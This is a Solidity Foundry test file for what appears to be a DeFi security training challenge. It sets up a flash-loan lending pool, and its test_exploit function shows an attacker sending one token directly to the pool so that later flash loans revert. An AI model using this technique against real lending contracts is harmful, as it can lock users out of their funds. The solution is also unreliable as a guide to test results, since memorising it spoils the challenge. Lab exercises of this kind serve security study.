// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {LenderPool} from "contracts/hack/lend/LenderPool.sol";
import {ReceiverPool} from "contracts/hack/lend/ReceiverPool.sol";
import {AmazingToken} from "contracts/hack/lend/AmazingToken.sol";

import {Test, console,stdError} from "forge-std/Test.sol";

import {Utils} from "test/foundry/utils/Utils.sol";

contract LenderTest is Test {
    Utils internal utils;
    address public someUser;
    address public attacker;
    address payable[] internal users;
    uint256 TOKENS_IN_POOL = 1000000 ether;
    uint256 INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

    AmazingToken token;
    LenderPool pool;
    ReceiverPool receiverContract;

    function setUp() public {

        utils = new Utils();
        users = utils.createUsers(4);

        attacker = users[0];
        someUser = users[1];

        token = new AmazingToken();
        pool = new LenderPool(address(token));

        // setup tokens
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        vm.startPrank(someUser);
        receiverContract = new ReceiverPool(address(pool));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }

    function test_exploit() public  {
        vm.startPrank(attacker);
        token.transfer(address(pool), 1);
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }

    function success() public  {
        /** SUCCESS CONDITIONS */
        // It is no longer possible to execute flash loans
        vm.expectRevert(stdError.assertionError);
        vm.prank(someUser);
        receiverContract.executeFlashLoan(10);
    }
}
